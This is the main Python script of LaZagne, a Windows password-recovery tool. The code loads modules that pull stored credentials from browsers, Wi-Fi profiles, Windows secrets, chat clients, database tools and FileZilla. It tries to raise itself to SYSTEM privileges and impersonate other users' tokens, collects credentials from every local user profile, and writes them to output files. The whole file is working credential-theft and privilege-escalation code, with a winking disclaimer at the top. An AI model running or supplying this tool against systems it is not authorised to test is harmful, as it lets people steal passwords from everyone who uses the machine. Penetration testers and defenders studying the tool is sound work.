#!/usr/bin/python

##############################################################################
#                                                                            #
#                           By Alessandro ZANNI                              #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)
import argparse
import time, sys, os
import logging
import tempfile
import shutil
import random
import json
import psutil
import getpass
import traceback

# used for inteprocesses communication (for impersonation)
import rpyc
from rpyc.utils.server import ThreadedServer

# Softwares that passwords can be retrieved without needed to be in the user environmment
from lazagne.softwares.browsers.mozilla import Mozilla
from lazagne.softwares.wifi.wifi import Wifi
from lazagne.softwares.windows.secrets import Secrets
from lazagne.softwares.chats.jitsi import Jitsi
from lazagne.softwares.chats.pidgin import Pidgin
from lazagne.softwares.databases.dbvis import Dbvisualizer
from lazagne.softwares.databases.sqldeveloper import SQLDeveloper
from lazagne.softwares.games.kalypsomedia import KalypsoMedia
from lazagne.softwares.games.roguestale import RoguesTale
from lazagne.softwares.sysadmin.filezilla import Filezilla

# Configuration
from lazagne.config.header import Header
from lazagne.config.write_output import write_header, write_footer, print_footer, print_debug, parseJsonResultToBuffer, print_output
from lazagne.config.constant import *
from lazagne.config.manageModules import get_categories, get_modules
from lazagne.config.changePrivileges import ListSids, GetUserName, create_proc_as_sid, rev2self, getsystem

# Tab containing all children passwords
stdoutRes = []
pids = []

category = get_categories()
moduleNames = get_modules()

# Define a dictionary for all modules
modules = {}
for categoryName in category:
	modules[categoryName] = {}

# Add all modules to the dictionary
for module in moduleNames:
	modules[module.category][module.options['dest']] = module
modules['mails']['thunderbird'] = Mozilla(True) # For thunderbird (firefox and thunderbird use the same class)

def output():
	if args['write_normal']:
		constant.output = 'txt'
	
	if args['write_json']:
		constant.output = 'json'

	if args['write_all']:
		constant.output = 'all'

	if constant.output:
		if not os.path.exists(constant.folder_name):
			os.makedirs(constant.folder_name)
			# constant.file_name_results = 'credentials' # let the choice of the name to the user
		
		if constant.output != 'json':
			write_header()

	# Remove all unecessary variables
	del args['write_normal']
	del args['write_json']
	del args['write_all']

def verbosity():
	# Write on the console + debug file
	if args['verbose']==0: level=logging.CRITICAL
	elif args['verbose'] == 1: level=logging.INFO
	elif args['verbose']>=2: level=logging.DEBUG
	
	FORMAT = "%(message)s"
	formatter = logging.Formatter(fmt=FORMAT)
	stream = logging.StreamHandler()
	stream.setFormatter(formatter)
	root = logging.getLogger()
	root.setLevel(level)
	# If other logging are set
	for r in root.handlers:
		r.setLevel(logging.CRITICAL)
	root.addHandler(stream)
	del args['verbose']

def launch_module(b, need_high_privileges=False, need_to_be_in_env=True):
	modulesToLaunch = []
	try:
		# Launch only a specific module
		for i in args:
			if args[i] and i in b:
				modulesToLaunch.append(i)
	except:
		# if no args
		pass

	# Launch all modules
	if not modulesToLaunch:
		modulesToLaunch = b
	
	for i in modulesToLaunch:
		# Retrieve modules that needs or not to be in the environment user
		if not ((not need_to_be_in_env and need_to_be_in_env == b[i].need_to_be_in_env) or need_to_be_in_env):
			continue

		# Retrieve modules that needs high privileges 
		if need_high_privileges ^ b[i].need_high_privileges:
			continue

		try:
			Header().title_info(i.capitalize()) 	# print title
			pwdFound = b[i].run(i.capitalize())		# run the module
			print_output(i.capitalize(), pwdFound) 	# print the results
			
			# return value - not used but needed 
			yield True, i.capitalize(), pwdFound
		except:
			traceback.print_exc()
			print
			error_message = traceback.format_exc()
			yield False, i.capitalize(), error_message

def manage_advanced_options():
	# File used for dictionary attacks
	if 'path' in args:
		constant.path = args['path']
	if 'bruteforce' in args: 
		constant.bruteforce = args['bruteforce']

	# Mozilla advanced options
	if 'manually' in args:
		constant.manually = args['manually']
	if 'specific_path' in args:
		constant.specific_path = args['specific_path']
	
	if 'mails' in args['auditType']:
		constant.mozilla_software = 'Thunderbird'
	elif 'browsers' in args['auditType']:
		constant.mozilla_software = 'Firefox'
	
	# Jitsi advanced options
	if 'master_pwd' in args:
		constant.jitsi_masterpass = args['master_pwd']
	
	# i.e advanced options
	if 'historic' in args:
		constant.ie_historic = args['historic']

# Run only one module
def runModule(category=None, need_high_privileges=False, need_to_be_in_env=True):
	if not category:
		try:
			category = args['auditType']
			manage_advanced_options()
		except:
			pass

	for r in launch_module(modules[category], need_high_privileges, need_to_be_in_env):
		yield r

# Run all
def runAllModules(need_high_privileges=False, need_to_be_in_env=True):
	try:
		manage_advanced_options()
	except:
		pass
	for categoryName in category:
		for r in launch_module(modules[categoryName], need_high_privileges, need_to_be_in_env):
			yield r

# Functions used to manage rpyc server (listening and receiving data)
global_cpt = 0
class MyServer(rpyc.Service):

	def exposed_echo(self, output):
		global stdoutRes
		try:
			stdoutRes += json.loads(output)
		except:
			pass

	def on_disconnect(self):
		global global_cpt
		global_cpt += 1
		if global_cpt >= len(pids):
			global server
			server.close()

def send_data(data, port):
	time.sleep(2)
	c = rpyc.connect("localhost", port)
	try:
		toSend = json.dumps(data)
	except:
		toSend = ''
	c.root.echo(toSend)

# write output to file (json and txt files)
def write_in_file(result):
	try:
		if constant.output == 'json' or constant.output == 'all':
			# Human readable Json format 
			prettyJson = json.dumps(result, sort_keys=True, indent=4, separators=(',', ': '))
			with open(constant.folder_name + os.sep + constant.file_name_results + '.json', 'w+') as f:
				f.write(prettyJson)
			print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.json'

		if constant.output == 'txt' or constant.output == 'all':
			with open(constant.folder_name + os.sep + constant.file_name_results + '.txt', 'a+b') as f:
				f.write(parseJsonResultToBuffer(result))
			write_footer()
			print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.txt'

	except Exception as e:
		print_debug('ERROR', 'Error writing the output file: %s' % e)

# Get user list to retrieve  their passwords
def get_user_list_on_filesystem(impersonated_user=[]):
	# Check users existing on the system (get only directories)
	all_users = os.walk('C:\\Users').next()[1]

	# Remove default users
	for user in ['All Users', 'Default User', 'Default', 'Public']:
		if user in all_users:
			all_users.remove(user)

	# Removing user that have already been impersonated
	for imper_user in impersonated_user:
		if imper_user in all_users:
			all_users.remove(imper_user)

	return all_users

# Used to print help menu when an error occurs
class MyParser(argparse.ArgumentParser):
	def error(self, message):
		sys.stderr.write('error: %s\n\n' % message)
		self.print_help()
		sys.exit(2)

# Print the title
Header().first_title()

parser = MyParser()
parser.add_argument('--version', action='version', version='Version ' + str(constant.CURRENT_VERSION), help='laZagne version')

# ------------------------------------------- Permanent options -------------------------------------------
# Version and verbosity 
PPoptional = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
PPoptional._optionals.title = 'optional arguments'
PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')
PPoptional.add_argument('-path', dest='path', action= 'store', help = 'path of a file used for dictionary file')
PPoptional.add_argument('-b', dest='bruteforce', action= 'store', help = 'number of character to brute force')
PPoptional.add_argument('--child', action= 'store_true', help=argparse.SUPPRESS)
PPoptional.add_argument('--rpyc_port', action= 'store', default=18829, help=argparse.SUPPRESS)

# Output 
PWrite = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
PWrite._optionals.title = 'Output'
PWrite.add_argument('-oN', dest='write_normal',  action='store_true', help = 'output file in a readable format')
PWrite.add_argument('-oJ', dest='write_json',  action='store_true', help = 'output file in a json format')
PWrite.add_argument('-oA', dest='write_all',  action='store_true', help = 'output file in all format')

# ------------------------------------------- Add options and suboptions to all modules -------------------------------------------
all_subparser = []
for c in category:
	category[c]['parser'] = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	category[c]['parser']._optionals.title = category[c]['help']
	
	# Manage options
	category[c]['subparser'] = []
	for module in modules[c].keys():
		m = modules[c][module]
		category[c]['parser'].add_argument(m.options['command'], action=m.options['action'], dest=m.options['dest'], help=m.options['help'])
		
		# Manage all suboptions by modules
		if m.suboptions and m.name != 'thunderbird':
			tmp = []
			for sub in m.suboptions:
				tmp_subparser = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
				tmp_subparser._optionals.title = sub['title']
				if 'type' in sub:
					tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'], dest=sub['dest'], help=sub['help'])
				else:
					tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'], help=sub['help'])
				tmp.append(tmp_subparser)
				all_subparser.append(tmp_subparser)
			category[c]['subparser'] += tmp

# ------------------------------------------- Print all -------------------------------------------
parents = [PPoptional] + all_subparser + [PWrite]
dic = {'all':{'parents':parents, 'help':'Run all modules', 'func': runAllModules}}
for c in category:
	parser_tab = [PPoptional, category[c]['parser']]
	if 'subparser' in category[c]:
		if category[c]['subparser']:
			parser_tab += category[c]['subparser']
	parser_tab += [PWrite]
	dic_tmp = {c: {'parents': parser_tab, 'help':'Run %s module' % c, 'func': runModule}}
	dic = dict(dic.items() + dic_tmp.items())

#2- Main commands
subparsers = parser.add_subparsers(help='Choose a main command')
for d in dic:
	subparsers.add_parser(d,parents=dic[d]['parents'],help=dic[d]['help']).set_defaults(func=dic[d]['func'],auditType=d)

# ------------------------------------------- Parse arguments -------------------------------------------
args = dict(parser.parse_args()._get_kwargs())
arguments = parser.parse_args()
start_time = time.time()
output()
verbosity()

# ------ Part used for user impersonation ------ 

currentUser = getpass.getuser()
argv = vars(arguments)['auditType']
current_filepath = sys.argv[0]
sids = ListSids()
isSystem = False
dataToSend = False
isChild = args.get('child', False)
rpyc_port = int(args.get('rpyc_port'))
rpyc_port_system = rpyc_port + 1

# Check if we have system privileges
for sid in sids:
	if sid[0] == os.getpid():
		if sid[2] == "S-1-5-18":
			isSystem = True

# System privileges
if isSystem:
	while True:
		try:
			server = ThreadedServer(MyServer, port=rpyc_port_system)
			break
		except:
			rpyc_port_system += 1

	# Get a list of user we could impersonate from token
	impersonateUsers = {}
	impersonated_user = []
	for sid in sids:
		if ' NT' not in sid[3].split('\\')[0] and 'NT ' not in sid[3].split('\\')[0] and 'Window' not in sid[3].split('\\')[0]:
			impersonateUsers.setdefault(sid[3], []).append(sid[2])

	# Impersonate an user
	for users in impersonateUsers:
		print_debug('INFO', '[!] Impersonate token user of %s' % users.encode('utf-8'))
		for sid in impersonateUsers[users]:
			try:
				pids.append(int(create_proc_as_sid(sid, "cmd.exe /c %s %s --child --rpyc_port %s" % (current_filepath, argv, str(rpyc_port_system)))))
				rev2self()
				try:
					# Store user when the impersonation succeed
					impersonated_user.append(users.split('\\')[1])
				except:
					pass
				
				break
			except Exception,e:
				print_debug('ERROR', str(e))
				pass

	# check if all process have been started
	time.sleep(4)
	for pid in pids:
		try:
			p = psutil.Process(pid) 
		except:
			# the process has not been started, the server should not wait for its result
			global_cpt += 1

	# start server until getting children results
	# childreen output stored in the stdoutRes tab
	server.start()

	all_users = get_user_list_on_filesystem(impersonated_user)

	# Ready to check for all users remaining
	for user_selected in all_users:
		print_debug('INFO', '[!] Trying to impersonate user: %s' % user_selected)
		print '\n\n########## User: %s ##########\n' % user_selected
		
		# Fix value by default for user environnment (appdata and userprofile)
		constant.userprofile = 'C:\\Users\\%s\\' % user_selected
		constant.appdata = 'C:\\Users\\%s\\AppData\\Roaming\\' % user_selected
		constant.finalResults = {'User': user_selected}
	
		# Retrieve passwords that need high privileges
		for r in arguments.func(need_to_be_in_env=False):
			pass
		stdoutRes.append(constant.finalResults)
	
	constant.finalResults = {}
	constant.finalResults['User'] = "SYSTEM"
	
	if not isChild:
		print '\n\n########## User: SYSTEM ##########\n' 

	# Retrieve passwords that need high privileges
	for r in arguments.func(need_high_privileges=True):
		pass

	if not isChild:
		# Print the entire output of children results
		print parseJsonResultToBuffer(stdoutRes, color=True)

	stdoutRes.append(constant.finalResults)
	if not isChild:
		write_in_file(stdoutRes)
	else:
		send_data(stdoutRes, rpyc_port)

# Not System
else:
	if isChild:
		# - Normal execution
		# - Send output to the local listenning server
		# - Quit
		dataToSend = True
	else:
		print_debug('INFO', 'We do not have system privileges')
		
		while True:
			try:
				server = ThreadedServer(MyServer, port=rpyc_port)
				break
			except:
				rpyc_port += 1

		try:
			# Trying to get system
			print_debug('INFO', 'Trying to get system')

			pid = int(getsystem("cmd.exe /c %s %s --child --rpyc_port %s" % (current_filepath, argv, str(rpyc_port))))
			print_debug('INFO', 'Get system privileges, waiting for impersonation process')
			
			# start server until getting children results
			# childreen output stored in the stdoutRes tab
			server.start()

		 	# Print final result with color
		 	print parseJsonResultToBuffer(stdoutRes, color=True)
			write_in_file(stdoutRes)
			
			# Everything was ok, we can exit
			sys.exit()

		except Exception as e:
			print_debug('WARNING', 'Not enough privileges to get system rights: %s' % e)
			# Is not system and is not elevated
			# Realize a normal execution
 
# ------ End of user impersonation ------ 

	constant.finalResults['User'] = currentUser
	print '\n\n########## User: %s ##########\n' % currentUser
	for return_code, software, pwdFounds  in arguments.func():
		pass

	# Output retrieved from a child process and sent to the local server
	if dataToSend:
		send_data([constant.finalResults], rpyc_port)
	
	# Output retrieved from a normal user (no admin privileges required)
	else:
		write_in_file([constant.finalResults])
		print_footer()

		elapsed_time = time.time() - start_time
		print '\nelapsed time = ' + str(elapsed_time)